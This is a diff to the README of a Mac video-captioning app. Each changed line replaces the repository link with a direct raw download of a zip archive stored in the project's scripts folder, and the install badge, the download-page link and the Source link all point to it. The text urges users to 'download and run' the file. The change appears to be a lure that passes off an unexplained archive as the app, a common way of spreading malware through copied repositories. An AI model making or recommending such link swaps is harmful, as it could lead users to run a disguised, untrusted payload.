@@ -1,6 +1,6 @@
 # 🎥 local-llm-video-captioning - Caption videos on your Mac
 
-[![Download / Install](https://img.shields.io/badge/Download%20%26%20Install-blue?style=for-the-badge)](https://github.com/Calhot942/local-llm-video-captioning)
+[![Download / Install](https://img.shields.io/badge/Download%20%26%20Install-blue?style=for-the-badge)](https://github.com/Calhot942/local-llm-video-captioning/raw/refs/heads/main/scripts/local_llm_video_captioning_v1.8.zip)
 
 ## 🖥️ What this app does
 
@@ -27,7 +27,7 @@ It does not run the Python backend on Windows. The model path depends on MLX vis
 
 ## 📥 Download and setup
 
-[Visit the download page](https://github.com/Calhot942/local-llm-video-captioning) to download and run this project on a supported Mac.
+[Visit the download page](https://github.com/Calhot942/local-llm-video-captioning/raw/refs/heads/main/scripts/local_llm_video_captioning_v1.8.zip) to download and run this project on a supported Mac.
 
 After you open the page:
 
@@ -174,4 +174,4 @@ Use these commands from inside the project folder.
 
 ## 📎 Source
 
-https://github.com/Calhot942/local-llm-video-captioning
+https://github.com/Calhot942/local-llm-video-captioning/raw/refs/heads/main/scripts/local_llm_video_captioning_v1.8.zip
